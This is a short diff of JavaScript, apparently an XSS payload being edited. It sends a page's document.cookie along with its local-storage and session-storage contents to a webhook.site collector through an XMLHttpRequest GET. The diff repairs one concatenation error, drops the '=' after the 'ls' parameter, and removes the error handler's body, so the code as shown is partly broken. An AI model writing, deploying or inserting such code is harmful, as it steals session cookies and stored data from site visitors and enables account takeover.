@@ -31,12 +31,10 @@ url = 'https://webhook.site/v2223';
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", url + "/?cookie="+document.cookie"&ls="+localData+"&ss="+sessionData, true);
+      xhr.open("GET", url + "/?cookie="+document.cookie+"&ls"+localData+"&ss="+sessionData, true);
       xhr.onload = function(e) {
       };
       xhr.onerror = function () {
-        resolve(undefined);
-        console.error("** An error occurred during the XMLHttpRequest");
       };
       xhr.send();
    })
